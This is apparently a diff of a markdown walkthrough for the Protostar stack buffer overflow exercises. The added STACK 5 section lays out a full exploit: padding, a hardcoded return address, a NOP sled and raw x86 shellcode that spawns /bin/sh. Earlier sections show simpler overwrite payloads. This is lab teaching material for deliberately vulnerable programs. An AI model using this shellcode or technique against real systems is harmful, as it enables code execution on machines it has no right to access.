@@ -37,7 +37,7 @@ int main(int argc, char **argv)
 }
 ```
 
-Our goal is modify `modified`'s value through `gets(buffer)` function. "Sound fabulous, how can i change this variable's value when i cant touch it ?". However, when you use [gdb](http://www.gnu.org/software/gdb/) to debug that file, you will recognize that `buffer`'s address is just below `modified`'s address in STACK. So, if we overload the `buffer`, the leftover will overwrite `modified` => the payload we need in this level is a string contains 70 * `A` (try more if you want).
+Our goal is modify **modified**'s value through **gets(buffer)** function. "Sound fabulous, how can i change this variable's value when i cant touch it ?". However, when you use [gdb](http://www.gnu.org/software/gdb/) to debug that file, you will recognize that **buffer**'s address is just below **modified**'s address in STACK. So, if we overload the **buffer**, the leftover will overwrite **modified** => the payload we need in this level is a string contains 70 * **A** (try more if you want).
 
 
 ## STACK 1
@@ -71,8 +71,8 @@ int main(int argc, char **argv)
 }
 ```
 
-Not only overload `buffer`, we need make `modified`'s value same as `0x61626364` (equal to `dcba` in ascii).
-Cuz the execute environment belongs to Little Endiance system, so you must `pack('<I', targetvalue)`
+Not only overload **buffer**, we need make **modified**'s value same as **0x61626364** (equal to **dcba** in ascii).
+Cuz the execute environment belongs to Little Endiance system, so you must **pack('<I', targetvalue)**
 
 ```
 payload = 64 * 'A' + pack('<I", '0x61626364')
@@ -307,4 +307,65 @@ Compose input file and inject to program
 code flow successfully changed
 [1]    50114 segmentation fault (core dumped)  ./stack4 < input4.b
 ```
+
+## STACK 5
+
+```
+/* stack5.c */
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+  char buffer[64];
+
+  gets(buffer);
+}
+```
+
+There is not **win()** function, just two line for initialization and read input. "Have you ever forgetten copying some thing ?"
+
+Don't worry, it is the great chance for us to make friend with shellcode.
+We should overwrite EIP (using technique from previous challenge) in order to redirect program execution to our shellcode, which also was injected to input data.
+
+```
+payload = flushdata + bufaddr + nopdata + shellcode
+```
+
+Easily to recognize that
+
+```
+flushdata = 'A' * 76
+```
+
+**bufaddr** points to shellcode's address in Stack. Using **gdb**, we have:
+
+```
+bufaddr = pack("<I", 0xffffdbe0)
+```
+
+**nopdata** was used to avoid the different between the memory address inside gdb and outside.
+
+```
+nopdata = "\x90" * 66
+```
+
+> What is **shellcode** ? Where should we find **shellcode** ?
+
+We can build our shellcode through using **msfvenom** in msf framework.
+
+This is shellcode i using:
+
+```
+shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+```
+
+Combine all of them together and **dd** whatever you want :D
+
+
+
+
+
 
